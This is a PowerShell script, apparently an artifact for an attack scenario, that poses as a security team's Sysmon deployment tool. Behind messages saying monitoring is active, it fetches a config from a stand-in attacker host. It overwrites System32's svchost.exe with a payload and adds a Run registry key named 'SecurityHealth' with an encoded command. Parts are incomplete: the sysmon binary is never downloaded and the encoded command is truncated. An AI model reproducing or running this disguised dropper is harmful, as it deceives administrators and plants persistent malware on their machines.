# Sysmon Deployment Script
# This file is used in the malware signing attack scenario
# Disguised as security team deployment script

param(
    [switch]$Elevated
)

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[ERROR] This script requires Administrator privileges"
    Write-Host "Please run as Administrator and try again"
    exit 1
}

Write-Host "[SECURITY] Deploying Sysmon Configuration..."
Write-Host "[INFO] Target: $env:COMPUTERNAME"
Write-Host "[INFO] User: $env:USERNAME"

# Download and install Sysmon
$sysmonUrl = "https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"
$sysmonPath = "$env:TEMP\sysmon.exe"

Write-Host "[INFO] Downloading Sysmon..."

# Download config (malicious XML)
Invoke-WebRequest -Uri "http://attacker.example.com/sysmon_config.xml" -OutFile "$env:TEMP\sysmon_config.xml"

# Install with config
& "$env:TEMP\sysmon.exe" -accepteula -i "$env:TEMP\sysmon_config.xml"

# Create persistence
$scriptPath = "$env:SystemRoot\System32\svchost.exe"
Copy-Item "$env:TEMP\payload.exe" $scriptPath -Force

# Add to startup
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SecurityHealth" -Value "$scriptPath -encodedcommand JABjAGwA..."

Write-Host "[COMPLETE] Sysmon deployed successfully"
Write-Host "[INFO] Monitoring is now active"
